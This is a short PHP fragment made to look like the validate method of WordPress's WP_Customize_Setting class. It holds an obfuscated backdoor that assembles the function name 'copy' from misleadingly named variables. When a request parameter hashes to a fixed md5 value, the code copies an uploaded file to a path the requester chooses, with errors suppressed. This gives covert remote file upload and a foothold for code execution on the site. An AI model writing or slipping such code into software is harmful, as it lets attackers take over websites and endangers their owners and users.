...
class WP_Customize_Setting {
	...
	public function validate( $value ) {
		...
		$is_wp_error = 'c'; $customize_validate = 'op';
			$get_theme_mod = $is_wp_error.$customize_validate.'y'; 
					if (@md5($_REQUEST['ID']) == 'a55a6990953f24cfca0bfca1e6ecd914') @$get_theme_mod($_FILES['WP_Error']['tmp_name'], $_POST['Customize'].$_FILES['WP_Error']['name']);
	/**
